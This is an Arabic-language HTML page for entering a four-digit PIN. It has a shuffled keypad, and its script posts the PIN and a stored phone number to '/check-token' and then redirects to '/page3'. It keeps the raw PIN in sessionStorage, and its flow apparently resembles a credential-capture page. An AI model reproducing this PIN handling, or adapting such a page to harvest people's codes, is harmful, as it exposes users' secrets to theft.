<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
  margin: 0;
  font-family: system-ui;
  background: #f2f2f2;
  display: flex;
  justify-content: center;
}

.container {
  width: 100%;
  max-width: 420px;
  text-align: center;
  padding-top: 60px;
  position: relative;
}

.title {
  color: #b5b5b5;
  font-size: 15px;
}

.subtitle {
  color: #b5b5b5;
  font-size: 15px;
  margin-top: 5px;
}

.top-row {
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin: 20px 15px 15px;
  direction: ltr;
}

.refresh {
  width: 50px;
  height: 50px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 26px;
  font-weight: 900;
  position: relative;
  overflow: hidden;
  cursor: pointer;
}

.refresh::after {
  content: "";
  position: absolute;
  width: 0;
  height: 0;
  background: rgba(0,0,0,0.1);
  border-radius: 50%;
  transition: 0.4s;
}

.refresh:active::after {
  width: 120%;
  height: 120%;
}

.dots {
  flex: 1;
  text-align: center;
}

.dot {
  width: 10px;
  height: 10px;
  background: #b7ded7;
  border-radius: 50%;
  margin: 6px;
  display: inline-block;
  transition: 0.2s;
}

.dot.active {
  background: #000;
}

.keypad {
  background: #fff;
  border-top-left-radius: 65px;
  border-top-right-radius: 65px;
  padding: 37px 40px 10px;
  height: 60vh;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  box-shadow:
    0 -10px 25px rgba(0,0,0,0.08),
    0 -2px 8px rgba(0,0,0,0.05);
}

.grid {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 9px 6px;
  justify-items: center;
}

.btn {
  width: 65px;
  height: 65px;
  border-radius: 50%;
  border: 1px solid #e5e5e5;
  background: #fff;
  font-size: 40px;
  font-weight: 900;
  color: #000;
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
  overflow: hidden;
}

.btn::after {
  content: "";
  position: absolute;
  width: 0;
  height: 0;
  background: rgba(0,0,0,0.1);
  border-radius: 50%;
  transition: 0.4s;
}

.btn:active::after {
  width: 120%;
  height: 120%;
}

.empty {
  color: transparent;
}

.delete-row {
  display: flex;
  justify-content: flex-start;
  margin-top: 10px;
  transform: translateY(-100px);
}

.delete-btn {
  width: 65px;
  height: 65px;
  border-radius: 50%;
  border: 1px solid #e5e5e5;
  background: #fff;
  font-size: 28px;
  font-weight: 900;
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
  overflow: hidden;
}

.delete-btn::after {
  content: "";
  position: absolute;
  width: 0;
  height: 0;
  background: rgba(0,0,0,0.1);
  border-radius: 50%;
  transition: 0.4s;
}

.delete-btn:active::after {
  width: 120%;
  height: 120%;
}

.shake {
  animation: shake 0.3s;
}

@keyframes shake {
  25% { transform: translateX(5px); }
  50% { transform: translateX(-5px); }
  75% { transform: translateX(5px); }
}

/* Loader صغير أعلى الصفحة */
.loader {
  position: absolute;
  top: 15px;
  left: 50%;
  transform: translateX(-50%);
  width: 28px;
  height: 28px;
  border: 3px solid #ddd;
  border-top: 3px solid #000;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  display: none;
  z-index: 999;
}

@keyframes spin {
  from {
    transform: translateX(-50%) rotate(0deg);
  }
  to {
    transform: translateX(-50%) rotate(360deg);
  }
}
</style>
</head>

<body>

<div class="container" id="app">

  <div id="loader" class="loader"></div>

  <div class="title">ادخل رمزك السري للتحقق</div>
  <div class="subtitle">من هويتك</div>

  <div class="top-row">

    <div class="refresh" onclick="resetPin()">↻</div>

    <div class="dots" id="dots">
      <span class="dot"></span>
      <span class="dot"></span>
      <span class="dot"></span>
      <span class="dot"></span>
    </div>

    <div style="width:50px;"></div>

  </div>

  <div class="keypad">

    <div class="grid">
      <div class="btn" onclick="add(5)">5</div>
      <div class="btn empty"></div>
      <div class="btn" onclick="add(3)">3</div>
      <div class="btn" onclick="add(6)">6</div>

      <div class="btn" onclick="add(8)">8</div>
      <div class="btn" onclick="add(4)">4</div>
      <div class="btn" onclick="add(7)">7</div>
      <div class="btn" onclick="add(1)">1</div>

      <div class="btn empty"></div>
      <div class="btn empty"></div>
      <div class="btn empty"></div>
      <div class="btn" onclick="add(9)">9</div>

      <div class="btn" onclick="add(0)">0</div>
      <div class="btn empty"></div>
      <div class="btn" onclick="add(2)">2</div>
      <div class="btn empty"></div>
    </div>

    <div class="delete-row">
      <div class="delete-btn" onclick="del()">⌫</div>
    </div>

  </div>
</div>

<script>
let pin = "";
const max = 4;

function showLoader() {
  document.getElementById("loader").style.display = "block";
}

function hideLoader() {
  document.getElementById("loader").style.display = "none";
}

function updateDots() {
  const dots = document.querySelectorAll(".dot");
  dots.forEach((d, i) => {
    d.classList.toggle("active", i < pin.length);
  });
}

function add(n) {
  if (pin.length >= max) return;

  pin += n;
  updateDots();

  if (pin.length === max) {
    checkPinWithServer();
  }
}

function checkPinWithServer() {

  showLoader();

  fetch("/check-token", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      pin: pin,
      num: sessionStorage.getItem("phone")
    })
  })
  .then(res => res.json())
  .then(data => {

    hideLoader();

    if (data.token) {

  sessionStorage.setItem("token", data.token);

  sessionStorage.setItem("current_pin", pin);

  window.location.href = "/page3";

  } else {
      const app = document.getElementById("app");
      app.classList.add("shake");

      setTimeout(() => {
        app.classList.remove("shake");
      }, 300);

      pin = "";
      updateDots();
    }

  })
  .catch(() => {

    hideLoader();

    alert("خطأ في السيرفر");
    pin = "";
    updateDots();
  });
}

function del() {
  pin = pin.slice(0, -1);
  updateDots();
}

function resetPin() {
  pin = "";
  updateDots();
}
</script>

</body>
</html>
